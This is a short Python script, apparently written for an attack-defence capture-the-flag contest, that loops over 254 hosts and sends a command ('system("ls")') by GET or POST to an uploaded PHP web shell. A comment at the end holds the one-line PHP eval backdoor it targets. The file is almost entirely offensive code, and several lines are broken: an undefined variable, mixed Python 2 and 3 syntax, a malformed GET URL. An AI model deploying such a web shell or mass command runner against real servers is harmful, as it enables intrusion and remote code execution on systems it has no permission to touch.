import requests
from lib.log import outputscreen

def web_shell_exec(shell_url,shell_method,shell_password,shell_command):
    info=open("info.txt","w")
    if shell_method=="GET":
        try:
            res = requests.get(url=f"{shell_url}+?{shell_password}={shell_command}",timeout=1)
            if res.status_code == requests.codes.ok:
                result = url+" connect shell sucess" + res.text
                outputscreen.success(result)
                print >>info,result
        except:
            outputscreen.error(shell_url + " connect shell fail!")    
    
    if shell_method=="POST":
        try:
            res = requests.post(url=url,data={shell_password:shell_command},timeout=1)
            if res.status_code == requests.codes.ok:
                result = url+" connect shell sucess" + res.text
                outputscreen.success(result)
        except:
            outputscreen.error(shell_url + " connect shell fail!")

    info.close()

for i in range(1,255):
    url=f"http://192-168-1-{i}.awd.bugku.cn/upload/admin/shell.php"
    command='system("ls");'
    web_shell_exec(url,"POST","L0nm4r",command)

'''
<?php @eval($_POST["l0nm4r"]);?>
'''
